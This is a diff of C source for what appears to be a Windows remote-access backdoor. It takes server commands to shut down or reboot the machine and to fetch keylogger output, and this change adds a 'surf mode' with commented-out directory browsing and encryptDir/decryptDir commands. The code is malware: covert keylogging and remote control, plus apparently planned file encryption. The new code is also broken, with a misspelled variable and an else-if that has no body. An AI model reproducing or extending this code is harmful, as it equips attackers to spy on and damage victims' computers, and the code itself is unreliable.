@@ -414,14 +414,26 @@ DWORD WINAPI execMessage(LPVOID paramT){
 	char server_reply[1024] = {0};
 	int recv_size = 0;
 
-	box cmd;
-	inisialisasi(cmd);
+	box normalCommandPack;
+	inisialisasi(normalCommandPack);
 
-	addCommand("SHUTDOWN", (void *)SHUTDOWN, cmd);
-	addCommand("REBOOT", (void *)REBOOT, cmd);
-	addCommand("EXIT", (void *)EXIT, cmd);
-	addCommand("HALLO", (void *)HALLO, cmd);
-	addCommand("GETKEYLOG", (void *)GETKEYLOG, cmd);
+	addCommand("SHUTDOWN", (void *)SHUTDOWN, normalCommandPack);
+	addCommand("REBOOT", (void *)REBOOT, normalCommandPack);
+	addCommand("EXIT", (void *)EXIT, normalCommandPack);
+	addCommand("HALLO", (void *)HALLO, normalCommandPack);
+	addCommand("GETKEYLOG", (void *)GETKEYLOG, normalCommandPack);
+
+	box surfCommandPack;
+	inisialisasi(surfCommandPack);
+
+	//addCommand("1", (void *)showMenu, surfCommandPack);
+	//addCommand("2", (void *)dirStructure, surfCommandPack);
+	//addCommand("3", (void *)printTree, surfCommandPack);
+	//addCommand("4", (void *)pwd, surfCommandPack);
+	//addCommand("5", (void *)encryptDir, surfCommandPack);
+	//addCommand("6", (void *)decryptDir, surfCommandPack);
+
+	unsigned char SURFMODE = 0;
 
 	while(1){
 		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
@@ -431,8 +443,20 @@ DWORD WINAPI execMessage(LPVOID paramT){
 				else (param)->socketStatus = 'X';
 				break;
 			} else {
-				proccess(server_reply, param, cmd);
-				printf("Server reply: %s\n", server_reply);
+				if(strcmp(server_reply, "SURFMODE") == 0){
+					SURFMODE = 1;
+					memset(server_reply, '\0', sizeof(server_reply));
+					continue;
+				}else if(strcmp(server_reply, "ENDSURFMODE") == 0){
+					SURFMODE = 0;
+					memset(server_reply, '\0', sizeof(server_reply));
+					continue;	
+				}
+
+				if (SURFMODE == 0) proccess(server_reply, param, normalCommandPack);
+				else if (SURMODE == 1)
+
+				//printf("Server reply: %s\n", server_reply);
 				memset(server_reply, '\0', sizeof(server_reply));
 			}
 		}
